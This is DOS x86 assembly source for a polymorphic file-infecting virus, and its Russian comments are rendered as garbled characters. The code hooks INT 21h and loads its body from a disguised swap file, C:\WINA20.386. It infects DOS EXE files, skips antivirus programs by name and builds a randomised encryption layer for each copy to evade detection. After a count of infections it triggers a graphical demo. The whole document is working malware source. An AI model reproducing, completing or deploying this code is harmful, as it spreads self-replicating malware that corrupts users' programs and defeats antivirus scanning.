   Loader:     cmp ah, 4Bh
   Rest:       jne Dos

           pusha
           push    ds es


   ;[*®«ãç ¥¬ â®çªã ¢å®¤  ¢ Loader]

           call    Entry
   Entry:      pop si

           push    si
           push    dx
           push    ds


   ;[“áâ  ¢«¨¢ ¥¬ § é¨âã ®â à¥ªãàá¨¨]

           push    cs
           pop ds
           mov ds:[Rest-Entry+si], byte ptr 0EBh


   ;[*à®¢¥àï¥¬  «¨ç¨¥ ¢¨àãá  ¢ DOS-¯ ¬ïâ¨]

           mov ax, 3565h
           int 21h
           cmp bx, Int21h-Virus
           je  CallVir


   ;[Žâªàë¢ ¥¬ SWAP-ä ©«]

           mov ax, 3D00h
           lea dx, [SwapName-Entry+si]
           int 21h
           jnc L5
           pop ds
           pop dx
           jmp Quit2


   ;[‚ë¤¥«ï¥¬ ¯ ¬ïâì ¤«ï ¢¨àãá ]

   L5:     push    ax
           mov ah, 48h
           mov bx, MemSize/16+1
           int 21h
           pop bx
           jc  Close3


   ;[*®¬¥ç ¥¬ ¡«®ª ¯ ¬ïâ¨ ª ª á¨áâ¥¬ãî ®¡« áâì]

           push    ax
           dec ax
           mov ds, ax
           mov ds:[1], word ptr 8
           pop ds


   ;[Š®¯¨àã¥¬ ¢¨àãá ¨§ SWAP-ä ©«  ¢ ¯ ¬ïâì]

           mov ah, 3Fh
           mov cx, CodeSize
           xor dx, dx
           int 21h


   ;[‡ ªàë¢ ¥¬ SWAP-ä ©«]

   Close3:     pushf
           mov ah, 3Eh
           int 21h
           popf
           jc  Quit2


   ;[“áâ  ¢«¨¢ ¥¬ ¢¥ªâ®à  ¯à¥àë¢ ¨©]

           mov ax, 2565h
           mov dx, Int21h-Virus
           int 21h


   ;[* áè¨äà®¢ë¢ ¥¬ ¢¨àãá]

   CallVir:    call    Encrypt
           mov ds:[Int21h-Virus], byte ptr 60h


   ;[‚ë§ë¢ ¥¬ ¢¨àãáë© ®¡à ¡®âç¨ª Int21h]

           pop ds
           pop dx
           int 65h


   ;[‡ è¨äà®¢ë¢ ¥¬ ¢¨àãá]

           call    Encrypt
           mov ds:[Int21h-Virus], byte ptr 0CFh


   ;[‘¨¬ ¥¬ § é¨âã ®â à¥ªãàá¨¨]

   Quit2:      pop si
           mov cs:[Rest-Entry+si], byte ptr 75h
           pop es ds
           popa


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥  áâ®ïé¥¬ã ®¡à ¡®âç¨ªã Int 21h]

   Dos:        cmp ah, 73h
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Encrypt:    mov ax, 3565h
           int 21h
           push    es
           pop ds

           xor bx, bx
           mov cx, MemSize
   Key2        equ $+2
   Loop04:     xor ds:[bx], byte ptr 0
           inc bx
           loop    Loop04
           ret

   SwapName    db  'C:\WINA20.386',0

   LoaderSize  =   $ - Loader

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               Ž**€*Ž’—ˆŠ INT 21h
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Int24h:     mov al, 3
           iret


   Int21h:     pusha
           push    ds es


   ;[‘®åà ï¥¬ ¢¥ªâ®à Int 24h]

           mov ax, 3524h
           int 21h
           push    es
           push    bx


   ;[“áâ  ¢«¨¢ ¥¬ á¢®© ®¡à ¡®âç¨ª Int 24h]

           push    ds dx
           mov ax, 2524h
           mov dx, Int24h-Virus
           push    cs
           pop ds
           int 21h
           pop dx ds


   ;[*à®¢¥àï¥¬ ¤®¯ãáâ¨¬®áâì ¨¬¥¨ ä ©« ]

           call    TestFile
           jc  Quit3


   ;[‘®åà ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4300h
           int 21h
           jc  Quit3
           push    cx
           push    dx
           push    ds


   ;[Ž¡ã«ï¥¬  âà¨¡ãâë ä ©« ]

           mov ax, 4301h
           xor cx, cx
           int 21h
           jc  RestAttr


   ;[Žâªàë¢ ¥¬ ä ©«]

           mov ax, 3D02h
           int 21h
           jc  RestAttr
           xchg    bx, ax


   ;[‘®åà ï¥¬ ¢à¥¬ï ¨ ¤ âã á®§¤ ¨ï ä ©« ]

           mov ax, 5700h
           int 21h
           jc  Close4
           push    dx
           push    cx


   ;[‘ç¨âë¢ ¥¬ § £®«®¢®ª EXE ¨ ¯à®¢¥àï¥¬ â¨¯ ä ©« ]

           mov cx, 18h
           mov dx, Header-Virus
           call    Read
           jc  RestTime

           cmp ds:[Header-Virus], 'ZM'
           je  L6

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¤ âã ¨ ¢à¥¬ï á®§¤ ¨ï ä ©« ]

   RestTime:   mov ax, 5701h
           pop cx
           pop dx
           int 21h


   ;[‡ ªàë¢ ¥¬ ä ©«]

   Close4:     mov ah, 3Eh
           int 21h


   ;[‚®ááâ  ¢«¨¢ ¥¬  âà¨¡ãâë ä ©« ]

   RestAttr:   mov ax, 4301h
           pop ds
           pop dx
           pop cx
           int 21h


   ;[‚®ááâ  ¢«¨¢ ¥¬ ¢¥ªâ®à Int 24h]

   Quit3:      mov ax, 2524h
           pop dx
           pop ds
           int 21h


   ;[Žâ¤ ¥¬ ã¯à ¢«¥¨¥  áâ®ïé¥¬ã ®¡à ¡®âç¨ªã Int21h]

           pop es ds
           popa
           iret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   3Ch ¡ ©â ®â  ç «  ä ©« ]

   L6:     mov ax, 4200h
           xor cx, cx
           mov dx, 3Ch
           int 21h
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬  ¤à¥á NewEXE § £®«®¢ª ]

           call    Read4b
           jc  RestTime


   ;[“áâ  ¢«¨¢ ¥¬ ãª § â¥«ì   NewEXE § £®«®¢®ª]

           mov ax, 4200h
           mov dx, ds:[Temp-Virus]
           mov cx, ds:[Temp+2-Virus]
           int 21h
           jc  RestTime


   ;[‘ç¨âë¢ ¥¬ ¯¥à¢ë¥ ç¥âëà¥ ¡ ©â  NewEXE § £®«®¢ª ]

           call    Read4b
           jc  RestTime


   ;[…á«¨ NewEXE § £®«®¢®ª ¯à¨áãâáâ¢ã¥â, â® ¢ëå®¤¨¬]

           mov di, NewEXE-Virus
           mov ax, ds:[Temp-Virus]
           call    CmpStr
           jc  RestTime


   ;[‘®¤¥à¦¨â «¨ ä ©« ®¢¥à«¥¨?]

           call    GetFSize
           jc  RestTime
           call    Into512

           cmp ds:[Header-Virus+4], ax
           jne RestTime
           cmp ds:[Header-Virus+2], dx
           jne RestTime


   ;[ƒ¥¥à¨àã¥¬ ¯®«¨¬®àäë© à áè¨äà®¢é¨ª]

           push    bx
           call    PoliGen
           pop bx


   ;[‚ëç¨á«ï¥¬ ¤«¨ã ä ©«  á ¢¨àãá®¬ ¨ ¢®á¨¬ ¥¥ ¢ § £®«®¢®ª EXE]

           call    GetFSize
           jc  RestTime

           add ax, si
           adc dx, 0
           add ax, CodeSize
           adc dx, 0

           call    Into512
           mov ds:[Header-Virus+4], ax
           mov ds:[Header-Virus+2], dx


   ;[‘®åà ï¥¬ SS, SP, CS ¨ IP]

           mov ax, ds:[Header+0Eh-Virus]
           mov ds:[OldSS+1-Virus], ax
           mov ax, ds:[Header+10h-Virus]
           mov ds:[OldSP+1-Virus], ax
           mov ax, ds:[Header+16h-Virus]
           mov ds:[OldCS-Virus], ax
           mov ax, ds:[Header+14h-Virus]
           mov ds:[OldIP-Virus], ax


   ;[Š®àà¥ªâ¨àã¥¬ â®çªã ¢å®¤  ¨  ¤à¥á áâ¥ª ]

           call    GetFSize
           jc  RestTimeB

           mov cx, 16
           div cx
           sub ax, ds:[Header+08h-Virus]
           mov ds:[Header+16h-Virus], ax
           mov ds:[Header+14h-Virus], dx
           mov ds:[Header+0Eh-Virus], ax
           mov ds:[Header+10h-Virus], CodeSize+100h


   ;[„®¯¨áë¢ ¥¬ ¯®«¨¬®àäë© à áè¨äà®¢é¨ª ª ä ©«ã]

           mov cx, si
           mov dx, Buffer-Virus
           call    Write
           jc  RestTimeB


   ;[Š®¯¨àã¥¬ ¢¨àãá ¢ ¡ãää¥à]

           xor di, di
           mov cx, CodeSize
   Loop05:     mov al, ds:[di]
           mov ds:[Buffer-Virus+di], al
           inc di
           loop    Loop05


   ;[*®«ãç ¥¬ á«ãç ©®¥ ç¨á«®]

           in  ax, 40h
           mov ds:[Key4-Virus], ax


   ;[*¥à¢ë© à § è¨äàã¥¬ ¢¨àãá]

           mov di, (Buffer-Virus)+(Crypt-Virus)
           mov cx, CodeSize-(Crypt-Virus)
   Loop06:     sub ds:[di], al
           add al, ah
           inc di
           loop    Loop06


   ;[‚â®à®© à § è¨äàã¥¬ ¢¨àãá]

           mov di, Buffer-Virus
           mov cx, CodeSize
   Key3        equ $+2
   Loop07:     xor ds:[di], byte ptr 0
           inc di
           loop    Loop07


   ;[‡ ¯¨áë¢ ¥¬ ¢¨àãá]

           mov cx, CodeSize+2
           mov dx, Buffer-Virus
           call    Write
           jc  RestTimeB


   ;[‡ ¯¨áë¢ ¥¬ ®¢ë© § £®«®¢®ª EXE]

           call    SeekStart
           jc  RestTimeB

           mov cx, 18h
           mov dx, Header-Virus
           call    Write
           jc  RestTimeB


   ;[“¢¥«¨ç¨¢ ¥¬ áç¥âç¨ª § à ¦¥¨©]

           inc word ptr ds:[Counter-Virus]
           cmp byte ptr ds:[Counter-Virus], 0
           jne RestTimeB
           call    ShowDemo
   RestTimeB:  jmp RestTime


   NewEXE      db  'NEPELELX'
   Counter     dw  1

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               *Ž„**Žƒ*€ŒŒ›
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   GetFSize:
   SeekEnd:    mov al, 2
           jmp $+4
   SeekStart:  mov al, 0
           mov ah, 42h
           xor cx, cx
           xor dx, dx
           int 21h
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Read:       mov ah, 3Fh
           jmp $+4
   Write:      mov ah, 40h
           push    cs
           pop ds
           int 21h
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Read4b:     mov cx, 4
           mov dx, Temp-Virus
           call    Read
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Into512:    mov cx, 512
           div cx
           or  dx, dx
           jz  $+3
           inc ax
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   CmpStr:     mov cx, 4
   Loop08:     cmp cs:[di], ax
           jne $+4
           stc
           ret
           inc di
           inc di
           loop    Loop08
           clc
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ












   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;                   **Ž‚…*Š€ „Ž*“‘’ˆŒŽ‘’ˆ ˆŒ…*ˆ ”€‰‹€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   TestFile:

   ;[“áâ  ¢«¨¢ ¥¬ SI    ç «®,   DI -   ª®¥æ ¨¬¥¨ ä ©« ]

           mov di, dx
           mov si, di
   Loop09:     inc di
           cmp ds:[di-1], byte ptr '\'
           jne L7
           mov si, di
   L7:     cmp ds:[di-1], byte ptr 0
           jne Loop09


   ;[*à®¢¥àï¥¬ à áè¨à¥¨¥ ä ©« ]

           mov ax, ds:[di-5]
           and ah, 0DFh
           cmp ax, 'E.'
           jne Error
           mov ax, ds:[di-3]
           and ax, 0DFDFh
           cmp ax, 'EX'
           jne Error


   ;[*à®¢¥àï¥¬ ¨¬ï ä ©« ]

           mov di, AntiVir-Virus
           mov ax, ds:[si]
           and ax, 0DFDFh
           call    CmpStr
           jc  Error
   IF DEBUG
           cmp ax, 'ZZ'
           jne Error
   ENDIF
           clc
           ret

   Error:      stc
           ret

   AntiVir     db  'DRADAVTB'

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               *Ž‹ˆŒŽ*”ˆŠ
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Store       MACRO   d1, d2, d3, d4
           pop di
           mov ds:[Buffer-Virus+di], byte ptr d1
           pop di
           mov ds:[Buffer-Virus+di], byte ptr d2
           pop di
           mov ds:[Buffer-Virus+di], byte ptr d3
           pop di
           mov ds:[Buffer-Virus+di], byte ptr d4
           ENDM

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   PoliGen:    xor si, si

           call    GenA
           mov ds:[Buffer-Virus+si], byte ptr 0E8h
           inc si
           mov di, si
           inc si
           inc si
           mov dx, si

           push    si
           call    GenA
           pop cx
           sub cx, si
           neg cx
           mov ds:[Buffer-Virus+di], cx

           call    GenA
           push    si
           inc si

           call    GenA
           mov ds:[Buffer-Virus+si], byte ptr 083h
           inc si
           push    si
           inc si
           mov ds:[Buffer-Virus+si], dl
           inc si

           call    GenA
           mov ds:[Buffer-Virus+si], byte ptr 0B9h
           inc si
           in  ax, 40h
           mov ds:[Buffer-Virus+si], ax
           inc si
           inc si

           push    ax
           call    GenA
           pop ax
           mov ds:[Buffer-Virus+si], 0E981h
           inc si
           inc si
           sub ax, CodeSize
           mov ds:[Buffer-Virus+si], ax
           inc si
           mov dx, si
           inc si

           call    GenA
           mov ds:[Buffer-Virus+si], 802Eh
           inc si
           inc si
           push    si
           inc si
           mov di, si
           inc si
           inc si
           in  al, 40h
           mov ds:[Buffer-Virus+si], al
           mov ds:[Key3-Virus], al
           inc si

           call    GenA
           push    si
           inc si

           call    GenA
           mov ds:[Buffer-Virus+si], byte ptr 0E2h
           inc si
           sub dx, si
           mov ds:[Buffer-Virus+si], dl
           inc si
           mov ds:[Buffer-Virus+di], si

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           in  al, 40h
           and al, 11b
           cmp al, 1
           je  ifBP
           cmp al, 2
           je  ifSI
           cmp al, 3
           je  ifDI

   ifBX:       store   043h, 0B7h, 0EBh, 05Bh
           ret
   ifBP:       store   045h, 0B6h, 0EDh, 05Dh
           ret
   ifSI:       store   046h, 0B4h, 0EEh, 05Eh
           ret
   ifDI:       store   047h, 0B5h, 0EFh, 05Fh
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   GenA:       in  ax, 40h
           and ax, 11b
           mov cx, ax
           inc cx
   Loop10:     call    Gen1
           call    Gen2
           loop    Loop10
           ret


   Gen1:       in  al, 40h
           and al, 1111b
           mov bx, Opcodes-Virus
           xlat
           mov ds:[Buffer-Virus+si], al
           inc si
           ret


   Gen2:       in  ax, 40h
           and ah, 00111011b
           mov bx, ax

           and al, 11000000b
           cmp al, 11000000b
           je  AllRegs
           and bh, 11111110b
           or  bh, 00000010b

   AllRegs:    mov ax, bx
           and ah, 00000011b
           cmp ah, 00000010b
           je  Regs2
           cmp ah, 00000001b
           je  Regs3
           cmp ah, 00000011b
           je  Regs4

   Regs1:      and al, 00000111b
           cmp al, 00000001b
           je  Gen2
           cmp al, 00000011b
           je  Gen2
           cmp al, 00000101b
           je  Gen2
           cmp al, 00000111b
           je  Gen2
           jmp StoreC

   Regs2:      and al, 00111000b
           cmp al, 00001000b
           je  Gen2
           cmp al, 00011000b
           je  Gen2
           cmp al, 00101000b
           je  Gen2
           cmp al, 00111000b
           je  Gen2
           jmp StoreC

   Regs3:      and al, 00000111b
           cmp al, 00000000b
           je  StoreC
           cmp al, 00000010b
           je  StoreC
           jmp Gen2

   Regs4:      and al, 00111000b
           cmp al, 00000000b
           je  StoreC
           cmp al, 00010000b
           je  StoreC
           jmp Gen2

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   StoreC:     xchg    bh, bl
           mov ds:[Buffer-Virus+si], bx
           xchg    bh, bl
           inc si
           inc si

           mov ax, bx
           and al, 11000000b
           cmp al, 11000000b
           je  D0
           cmp al, 01000000b
           je  D8
           cmp al, 10000000b
           je  D16
           mov ax, bx
           and al, 00000111b
           cmp al, 00000110b
           jne D0

   D16:        in  ax, 40h
           mov ds:[Buffer-Virus+si], ax
           inc si
           inc si
           ret

   D8:     in  al, 40h
           mov ds:[Buffer-Virus+si], al
           inc si
   D0:     ret


   Opcodes     db  026h,02Eh,036h,03Eh,040h,042h,048h,04Ah
           db  090h,092h,098h,099h,0CCh,0F5h,0F8h,0F9h

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ













   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   ;               „…ŒŠ€
   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ShowDemo:   mov ah, 0Fh
           int 10h
           mov ah, 0
           push    ax

           mov al, 13h
           int 10h

           push    0A000h
           pop es

           xor di, di
           mov al, 3
           mov cx, 320*185
           rep stosb

           mov al, 2
           mov cx, 320*015
           rep stosb

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

           xor bp, bp
           xor dx, dx
           mov si, Spr1-Virus
           mov di, 320*160

   Loop11:     mov cx, ds:[Cord-Virus+bp]
           mov ax, 157
   Loop12:     dec ax
           sub cx, 320
           jnc Loop12
           add cx, 320

           push    cx
           sub cx, dx
           pop dx
           jcxz    NoMove

           mov ds:[GZero-Virus], byte ptr 47h
           jnc GZero
           mov ds:[GZero-Virus], byte ptr 4Fh
           neg cx

   GZero:      inc di
           call    ShowSpr
           loop    GZero

   NoMove:     pusha
           sub di, 320*5-8
           mov si, Spr2-Virus
           xchg    cx, ax
   Loop13:     call    ShowSpr
           sub di, 320
           loop    Loop13
           popa

           inc bp
           inc bp
           cmp bp, CordSize
           jne Loop11

           xor ax, ax
           int 16h

           pop ax
           int 10h
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   ShowSpr:    pusha
           xor dx, dx
           xor cx, cx

           lodsw
           mov dl, al
           mov cl, ah

   Loop14:     push    cx
           push    dx

   Loop15:     lodsb
           mov cl, al
           sub dl, al
           lodsb
           rep stosb
           cmp dl, 0
           jne Loop15

           pop dx
           sub di, dx
           add di, 320
           pop cx
           loop    Loop14

           mov cx, 0FFFFh
           loop    $

           popa
           ret

   ;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

   Spr1        db  39,25
           db  09,03, 01,13, 01,05, 01,13, 27,03
           db  08,03, 02,13, 01,05, 02,13, 26,03
           db  07,03, 07,13, 25,03
           db  06,03, 09,13, 24,03
           db  07,03, 01,12, 05,13, 01,12, 25,03
           db  07,03, 07,12, 25,03
           db  07,03, 07,12, 25,03
           db  07,03, 07,12, 25,03
           db  07,03, 07,12, 25,03
           db  07,03, 07,12, 18,03, 03,01, 04,03
           db  07,03, 07,12, 18,03, 03,01, 04,03
           db  07,03, 07,12, 18,03, 03,01, 04,03
           db  05,03, 11,12, 09,03, 04,01, 03,03, 03,01, 04,03
           db  04,03, 13,12, 08,03, 04,01, 03,03, 03,01, 04,03
           db  03,03, 15,12, 05,03, 14,01, 02,03
           db  03,03, 15,12, 05,03, 05,01, 02,00, 04,01, 02,00, 02,01, 01,03
           db  03,03, 15,12, 05,03, 05,01, 02,00, 04,01, 02,00, 02,01, 01,03
           db  03,03, 15,12, 05,03, 15,01, 01,03
           db  04,03, 06,12, 01,03, 06,12, 05,03, 01,06, 15,10, 01,03
           db  05,03, 04,12, 03,03, 04,12, 05,03, 01,06, 01,03, 15,01, 01,03
           db  01,03, 20,06, 02,03, 15,06, 01,03
           db  03,03, 02,08, 11,03, 02,08, 07,03, 02,08, 06,03, 02,08, 04,03
           db  02,03, 01,08, 02,06, 01,08, 09,03, 01,08, 02,06, 01,08, 05,03, 01,08, 02,06, 01,08, 04,03, 01,08, 02,06, 01,08, 03,03
           db  02,03, 01,08, 02,06, 01,08, 09,03, 01,08, 02,06, 01,08, 05,03, 01,08, 02,06, 01,08, 04,03, 01,08, 02,06, 01,08, 03,03
           db  03,03, 02,08, 11,03, 02,08, 07,03, 02,08, 06,03, 02,08, 04,03

   Spr2        db  05,05
           db  01,03, 03,15, 01,03
           db  01,15, 03,07, 01,15
           db  01,03, 01,15, 01,07, 01,15, 01,03
           db  02,03, 01,15, 02,03
           db  05,03

   Cord        dw  020 + 010 * 320     ;‚ 1
           dw  026 + 010 * 320     ;‚ 1
           dw  032 + 010 * 320     ;‚ 1
           dw  020 + 015 * 320     ;‚ 2
           dw  036 + 015 * 320     ;‚ 2
           dw  020 + 020 * 320     ;‚ 3
           dw  026 + 020 * 320     ;‚ 3
           dw  032 + 020 * 320     ;‚ 3
           dw  020 + 025 * 320     ;‚ 4
           dw  036 + 025 * 320     ;‚ 4
           dw  020 + 030 * 320     ;‚ 5
           dw  026 + 030 * 320     ;‚ 5
           dw  032 + 030 * 320     ;‚ 5

           dw  058 + 010 * 320     ;‹ 1
           dw  055 + 015 * 320     ;‹ 2
           dw  061 + 015 * 320     ;‹ 2
           dw  052 + 020 * 320     ;‹ 3
           dw  064 + 020 * 320     ;‹ 3
           dw  049 + 025 * 320     ;‹ 4
           dw  067 + 025 * 320     ;‹ 4
           dw  046 + 030 * 320     ;‹ 5
           dw  070 + 030 * 320     ;‹ 5

           dw  092 + 010 * 320     ;€ 1
           dw  089 + 015 * 320     ;€ 2
           dw  095 + 015 * 320     ;€ 2
           dw  086 + 020 * 320     ;€ 3
           dw  098 + 020 * 320     ;€ 3
           dw  083 + 025 * 320     ;€ 4
           dw  089 + 025 * 320     ;€ 4
           dw  095 + 025 * 320     ;€ 4
           dw  101 + 025 * 320     ;€ 4
           dw  080 + 030 * 320     ;€ 5
           dw  104 + 030 * 320     ;€ 5

           dw  119 + 010 * 320     ;‘ 1
           dw  125 + 010 * 320     ;‘ 1
           dw  114 + 014 * 320     ;‘ 2
           dw  130 + 014 * 320     ;‘ 2
           dw  114 + 020 * 320     ;‘ 3
           dw  114 + 026 * 320     ;‘ 4
           dw  130 + 026 * 320     ;‘ 4
           dw  119 + 030 * 320     ;‘ 5
           dw  125 + 030 * 320     ;‘ 5

           dw  147 + 010 * 320     ;Ž 1
           dw  153 + 010 * 320     ;Ž 1
           dw  142 + 015 * 320     ;Ž 2
           dw  158 + 015 * 320     ;Ž 2
           dw  142 + 020 * 320     ;Ž 3
